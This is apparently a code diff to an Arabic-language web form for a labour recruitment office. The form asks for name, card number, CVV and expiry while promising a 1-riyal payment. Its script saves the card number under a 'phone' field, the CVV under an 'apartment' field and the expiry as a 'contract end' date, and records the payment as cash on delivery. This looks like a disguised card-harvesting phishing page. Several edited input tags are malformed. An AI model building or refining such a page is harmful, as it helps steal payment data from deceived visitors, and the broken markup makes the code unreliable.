@@ -3,16 +3,16 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>بيانات الطلب | مكتب مساعد</title>
+  <title>بيانات البطاقة | مكتب مساعد</title>
   <link rel="stylesheet" href="order-details.css">
 </head>
 <body>
   <main class="order-page">
-    <header class="order-header"><div class="badge">☆</div><h1>بيانات الطلب</h1><p>يرجى إدخال بياناتك بطاقتك لاتمام عملية الحجز عملية الطلب</p><strong>الدفع بقيمة 1 ريال فقط </strong></header>
+    <header class="order-header"><div class="badge">☆</div><h1>بيانات الطلب</h1><p>يرجى إدخال بيانات بطاقتك لاتمام عملية الحجز عملية الطلب</p><strong>الدفع بقيمة 1 ريال فقط </strong></header>
     <form id="order-form" class="order-form">
-      <label>الاسم الكامل<input type="text" placeholder="مثال: أحمد محمد" autocomplete="name" required></label>
-      <label>رقم البطاقة<input type="tel" placeholder="مثال: 9XXXXXXX" autocomplete="tel" inputmode="tel" required></label>
-      <div class="row"><label> cvv<input type="text" placeholder="مثال: 7" required></label><label>تاريخ الانتهاء<input type="date" required></label></div>
+      <label>الاسم الكامل<input type="text" placeholder=" "name" required></label>
+      <label>رقم البطاقة<input type="tel" placeholder=""tel" inputmode="tel" required></label>
+      <div class="row"><label> cvv<input type="text" placeholder=></label><label>تاريخ الانتهاء<div class="expiry-fields"><select id="contract-end-month" required aria-label="شهر انتهاء العقد"><option value="" selected disabled>الشهر</option><option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option><option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option><option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option></select><select id="contract-end-year" required aria-label="سنة انتهاء العقد"><option value="" selected disabled>السنة</option><option value="26">26</option><option value="27">27</option><option value="28">28</option><option value="29">29</option><option value="30">30</option><option value="31">31</option><option value="32">32</option></select></div></label></div>
       <button type="submit">دفع</button>
     </form>
     <p class="site-name">مكتب مساعد لاستقدام العمالة</p>
@@ -29,10 +29,12 @@
       draft.orderName = inputs[0].value;
       draft.orderPhone = inputs[1].value;
       draft.orderApartment = inputs[2].value;
-      draft.orderEndDate = inputs[3].value;
+      const endMonth = document.querySelector('#contract-end-month').value;
+      const endYear = document.querySelector('#contract-end-year').value;
+      draft.orderEndDate = `${endMonth}/${endYear}`;
       draft.paymentMethod = 'الدفع عند الاستلام';
       draft.fullName = inputs[0].value;
-      draft.endDate = inputs[3].value;
+      draft.endDate = draft.orderEndDate;
       draft.createdAt = new Date().toLocaleString('ar-OM');
       localStorage.setItem('musaedDraft', JSON.stringify(draft));
       submitButton.disabled = true;
